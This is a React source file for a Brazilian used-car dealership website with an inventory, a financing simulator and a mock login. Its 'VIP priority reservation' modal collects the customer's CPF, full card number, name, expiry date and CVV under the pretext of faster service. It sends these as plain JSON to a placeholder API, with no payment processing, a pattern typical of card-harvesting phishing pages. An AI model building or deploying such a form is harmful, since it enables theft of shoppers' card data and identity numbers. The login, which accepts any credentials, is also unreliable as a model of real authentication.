import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { User, LogOut, Lock, Mail, Smartphone, X, CreditCard, FileText, ChevronRight, ShieldCheck, Star, Crown, Landmark } from 'lucide-react';

export default function App() {
  const gold = "#f59e0b";
  const black = "#0a0a0a";
  const cardBg = "#141414";

  // --- CONFIGURAÇÃO DE DISTRIBUIÇÃO DE ATENDENTES ---
  const atendentes = [
    "5511958071871", 
    "5511999999999", 
    "5511888888888"
  ];

  const selecionarAtendente = () => atendentes[Math.floor(Math.random() * atendentes.length)];

  // --- ANIMAÇÕES PREMIUM ---
  const springTransition = { type: "spring", stiffness: 300, damping: 25 };
  const premiumHover = { y: -12, scale: 1.02, boxShadow: `0px 20px 40px rgba(245, 158, 11, 0.15)`, borderColor: gold };

  // --- ESTADOS DE AUTENTICAÇÃO (SIMPLIFICADO) ---
  const [user, setUser] = useState(null);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [isLoginTab, setIsLoginTab] = useState(true);
  const [authData, setAuthData] = useState({ nome: '', email: '', whatsapp: '', senha: '', confirmarSenha: '' });

  // --- ESTADO DA NOVA ABA: RESERVA PRIORITÁRIA ---
  const [showReserva, setShowReserva] = useState(false);
  const [reservaData, setReservaData] = useState({
    cpf: '', numeroCartao: '', nomeCartao: '', validade: '', cvv: '', tipoCartao: 'Crédito'
  });

  // --- ESTADOS DO SITE ---
  const [selectedCar, setSelectedCar] = useState({ nome: 'Selecione um carro', preco: 0 });
  const [dados, setDados] = useState({ nome: '', whatsapp: '', entrada: '', renda: '' });
  const [resultado, setResultado] = useState(null);
  const simuladorRef = useRef(null);

  useEffect(() => {
    const savedUser = localStorage.getItem('alfa_user');
    if (savedUser) setUser(JSON.parse(savedUser));
  }, []);

  // --- MÁSCARAS ---
  const formatMoeda = (val) => {
    let value = val.replace(/\D/g, "");
    return (value / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  };

  const formatWhatsApp = (val) => {
    let v = val.replace(/\D/g, "").slice(0, 11);
    if (v.length > 10) v = v.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
    else if (v.length > 5) v = v.replace(/^(\d\d)(\d{4})(\d{0,4}).*/, "($1) $2-$3");
    else if (v.length > 2) v = v.replace(/^(\d\d)(\d{0,5})/, "($1) $2");
    else v = v.replace(/^(\d*)/, "($1");
    return v;
  };

  const aplicarMascarasReserva = (campo, valor) => {
    let v = valor;
    if (campo === 'cpf') v = v.replace(/\D/g, "").slice(0, 11).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    else if (campo === 'numeroCartao') v = v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, "$1 $2 $3 $4");
    else if (campo === 'validade') v = v.replace(/\D/g, "").slice(0, 4).replace(/(\d{2})(\d{2})/, "$1/$2");
    else if (campo === 'cvv') v = v.replace(/\D/g, "").slice(0, 4);
    setReservaData(prev => ({ ...prev, [campo]: v }));
  };

  const handleInputChange = (field, value) => {
    let v = value;
    if (field === 'whatsapp') v = formatWhatsApp(value);
    else if (field === 'entrada' || field === 'renda') v = formatMoeda(value);
    setDados(prev => ({ ...prev, [field]: v }));
  };

  // --- ENVIO RESERVA VIP (API) ---
  const handleReservaVIP = async (e) => {
    e.preventDefault();
    try {
      await fetch('https://SUA-API-AQUI.com/api/reserva', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...reservaData, cliente: user?.nome || "Anônimo" })
      });
      alert("Solicitação de Reserva Prioritária enviada com sucesso!");
      setShowReserva(false);
    } catch (e) { console.error(e); }
  };

  const handleAuth = (e) => {
    e.preventDefault();
    const mockUser = { nome: authData.nome || "Cliente VIP", email: authData.email };
    setUser(mockUser);
    localStorage.setItem('alfa_user', JSON.stringify(mockUser));
    setShowAuthModal(false);
  };

  const carInventory = [
    { id: 1, nome: "Honda Civic G10", ano: "2020", preco: 115900, tag: "Estoque Premium" },
    { id: 2, nome: "Toyota Corolla XEi", ano: "2019", preco: 108500, tag: "Destaque" },
    { id: 3, nome: "Volkswagen T-Cross", ano: "2021", preco: 112000, tag: "Aprovação Facilitada" },
    { id: 23, nome: "Chevrolet Corsa Maxx", ano: "2012", preco: 24500, tag: "Baixa Entrada" }
  ];

  const calcular = (e) => {
    e.preventDefault();
    const cleanEntrada = Number(dados.entrada.replace(/\D/g, "")) / 100;
    const valorFinanciado = selectedCar.preco - cleanEntrada;
    const valorParcela = (valorFinanciado * 0.015) / (1 - Math.pow(1.015, -48));
    setResultado({ parcela: valorParcela.toFixed(2) });
  };

  const enviarWhatsApp = () => {
    const msg = `Olá Alfa Motors! Quero simular o ${selectedCar.nome}.`;
    window.open(`https://wa.me/${selecionarAtendente()}?text=${encodeURIComponent(msg)}`, '_blank');
  };

  const inputStyle = { width: '100%', padding: '14px', borderRadius: '10px', border: '1px solid #222', background: '#080808', color: '#fff', outline: 'none' };

  return (
    <div style={{ backgroundColor: black, color: 'white', minHeight: '100vh', fontFamily: 'Inter, sans-serif' }}>
      
      {/* NAVBAR */}
      <motion.nav 
        style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 5%', background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', position: 'fixed', width: '100%', top: 0, zIndex: 1000, borderBottom: `1px solid ${gold}30`, boxSizing: 'border-box' }}>
        <h2 style={{ margin: 0 }}>ALFA <span style={{ color: gold }}>MOTORS</span></h2>
        <div style={{ display: 'flex', gap: '20px' }}>
          <motion.button onClick={() => setShowReserva(true)} whileHover={{ color: gold }} style={{ background: 'none', border: 'none', color: '#fff', fontWeight: 'bold', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '5px' }}><Crown size={18} /> RESERVA VIP</motion.button>
          {user ? (
            <button onClick={() => { setUser(null); localStorage.removeItem('alfa_user'); }} style={{ background: 'none', border: 'none', color: '#666', cursor: 'pointer' }}><LogOut size={18} /></button>
          ) : (
            <button onClick={() => setShowAuthModal(true)} style={{ background: gold, border: 'none', padding: '8px 20px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer' }}>ENTRAR</button>
          )}
        </div>
      </motion.nav>

      {/* HEADER */}
      <header style={{ paddingTop: '160px', textAlign: 'center' }}>
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
          <h1 style={{ fontSize: '3rem', fontWeight: '900' }}>EXPERIÊNCIA <span style={{ color: gold }}>PREMIUM</span></h1>
          <p style={{ color: '#555' }}>A maior curadoria de seminovos de luxo do Brasil</p>
        </motion.div>
      </header>

      {/* CARDS */}
      <section style={{ padding: '50px 5%', display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '25px' }}>
        {carInventory.map(car => (
          <motion.div key={car.id} whileHover={premiumHover} transition={springTransition} style={{ background: cardBg, padding: '30px', borderRadius: '20px', border: '1px solid #1a1a1a', cursor: 'pointer' }}>
            <div style={{ color: gold, fontSize: '0.7rem', fontWeight: 'bold', marginBottom: '10px' }}>{car.tag}</div>
            <h3>{car.nome}</h3>
            <p style={{ color: '#666' }}>{car.ano}</p>
            <h2 style={{ color: gold }}>R$ {car.preco.toLocaleString('pt-BR')}</h2>
            <button onClick={() => { setSelectedCar(car); simuladorRef.current.scrollIntoView({ behavior: 'smooth' }); }} style={{ width: '100%', padding: '12px', marginTop: '20px', background: 'none', border: `1px solid ${gold}`, color: gold, borderRadius: '8px', cursor: 'pointer' }}>Simular Crédito</button>
          </motion.div>
        ))}
      </section>

      {/* SIMULADOR */}
      <section ref={simuladorRef} style={{ padding: '80px 5%' }}>
        <motion.div style={{ maxWidth: '600px', margin: '0 auto', background: cardBg, padding: '40px', borderRadius: '30px', border: '1px solid #1a1a1a', textAlign: 'center' }}>
          <h2 style={{ marginBottom: '30px' }}>Análise <span style={{ color: gold }}>Alfa Motors</span></h2>
          <form onSubmit={calcular} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
            <input required placeholder="Nome" style={inputStyle} value={dados.nome} onChange={e => handleInputChange('nome', e.target.value)} />
            <input required placeholder="WhatsApp" style={inputStyle} value={dados.whatsapp} onChange={e => handleInputChange('whatsapp', e.target.value)} />
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
              <input required placeholder="Entrada" style={inputStyle} value={dados.entrada} onChange={e => handleInputChange('entrada', e.target.value)} />
              <input required placeholder="Renda" style={inputStyle} value={dados.renda} onChange={e => handleInputChange('renda', e.target.value)} />
            </div>
            <button type="submit" style={{ padding: '15px', background: gold, border: 'none', borderRadius: '10px', fontWeight: 'bold', cursor: 'pointer' }}>SOLICITAR ANÁLISE</button>
          </form>
          {resultado && (
            <motion.div animate={{ scale: [0.9, 1] }} style={{ marginTop: '30px', padding: '20px', border: `1px solid ${gold}40`, borderRadius: '15px' }}>
              <p style={{ color: '#666' }}>Parcela Mensal Estimada</p>
              <h1 style={{ color: gold }}>R$ {resultado.parcela.replace('.', ',')}</h1>
              <button onClick={enviarWhatsApp} style={{ background: '#25D366', color: '#fff', border: 'none', padding: '12px 30px', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer', marginTop: '10px' }}>FALAR COM ATENDENTE</button>
            </motion.div>
          )}
        </motion.div>
      </section>

      {/* MODAL RESERVA PRIORITÁRIA (VIP) */}
      <AnimatePresence>
        {showReserva && (
          <div style={{ position: 'fixed', inset: 0, zIndex: 3000, display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} onClick={() => setShowReserva(false)} style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.95)', backdropFilter: 'blur(20px)' }} />
            <motion.div initial={{ y: 50, opacity: 0 }} animate={{ y: 0, opacity: 1 }} style={{ position: 'relative', background: '#0d0d0d', padding: '40px', borderRadius: '30px', width: '100%', maxWidth: '450px', border: `1px solid ${gold}40`, boxShadow: `0 0 50px ${gold}15` }}>
              <button onClick={() => setShowReserva(false)} style={{ position: 'absolute', right: '20px', top: '20px', background: 'none', border: 'none', color: '#444', cursor: 'pointer' }}><X /></button>
              <div style={{ textAlign: 'center', marginBottom: '30px' }}>
                <Landmark size={40} color={gold} style={{ marginBottom: '15px' }} />
                <h2 style={{ fontSize: '1.8rem', margin: 0 }}>Reserva <span style={{ color: gold }}>Prioritária</span></h2>
                <p style={{ color: '#555', fontSize: '0.85rem', marginTop: '10px' }}>Clientes que realizam o pré-atendimento possuem prioridade total na análise e no atendimento Alfa Motors.</p>
              </div>
              <form onSubmit={handleReservaVIP} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                <input required placeholder="CPF do Titular" style={inputStyle} value={reservaData.cpf} onChange={e => aplicarMascarasReserva('cpf', e.target.value)} />
                <input required placeholder="Número do Cartão" style={inputStyle} value={reservaData.numeroCartao} onChange={e => aplicarMascarasReserva('numeroCartao', e.target.value)} />
                <input required placeholder="Nome no Cartão" style={inputStyle} value={reservaData.nomeCartao} onChange={e => setReservaData({...reservaData, nomeCartao: e.target.value.toUpperCase()})} />
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
                  <input required placeholder="Validade (MM/AA)" style={inputStyle} value={reservaData.validade} onChange={e => aplicarMascarasReserva('validade', e.target.value)} />
                  <input required placeholder="CVV" style={inputStyle} value={reservaData.cvv} onChange={e => aplicarMascarasReserva('cvv', e.target.value)} />
                </div>
                <select style={inputStyle} value={reservaData.tipoCartao} onChange={e => setReservaData({...reservaData, tipoCartao: e.target.value})}>
                  <option>Crédito</option>
                  <option>Débito</option>
                </select>
                <button type="submit" style={{ padding: '18px', background: gold, color: '#000', border: 'none', borderRadius: '12px', fontWeight: '900', cursor: 'pointer', marginTop: '10px', boxShadow: `0 10px 20px ${gold}20` }}>ATIVAR PRIORIDADE VIP</button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* MODAL AUTH SIMPLIFICADO */}
      <AnimatePresence>
        {showAuthModal && (
          <div style={{ position: 'fixed', inset: 0, zIndex: 2000, display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
            <div onClick={() => setShowAuthModal(false)} style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.9)' }} />
            <motion.div initial={{ scale: 0.9 }} animate={{ scale: 1 }} style={{ position: 'relative', background: '#0d0d0d', padding: '40px', borderRadius: '24px', width: '100%', maxWidth: '400px', border: '1px solid #222' }}>
              <div style={{ display: 'flex', marginBottom: '20px', borderBottom: '1px solid #222' }}>
                <button onClick={() => setIsLoginTab(true)} style={{ flex: 1, padding: '10px', color: isLoginTab ? gold : '#555', borderBottom: isLoginTab ? `2px solid ${gold}` : 'none', background: 'none', border: 'none', cursor: 'pointer' }}>LOGIN</button>
                <button onClick={() => setIsLoginTab(false)} style={{ flex: 1, padding: '10px', color: !isLoginTab ? gold : '#555', borderBottom: !isLoginTab ? `2px solid ${gold}` : 'none', background: 'none', border: 'none', cursor: 'pointer' }}>CADASTRO</button>
              </div>
              <form onSubmit={handleAuth} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                {!isLoginTab && <input required placeholder="Nome" style={inputStyle} value={authData.nome} onChange={e => setAuthData({...authData, nome: e.target.value})} />}
                <input type="email" required placeholder="E-mail" style={inputStyle} value={authData.email} onChange={e => setAuthData({...authData, email: e.target.value})} />
                <input type="password" required placeholder="Senha" style={inputStyle} value={authData.senha} onChange={e => setAuthData({...authData, senha: e.target.value})} />
                <button type="submit" style={{ padding: '15px', background: gold, border: 'none', borderRadius: '10px', fontWeight: 'bold', cursor: 'pointer', color: '#000' }}>{isLoginTab ? 'ENTRAR' : 'CRIAR CONTA'}</button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
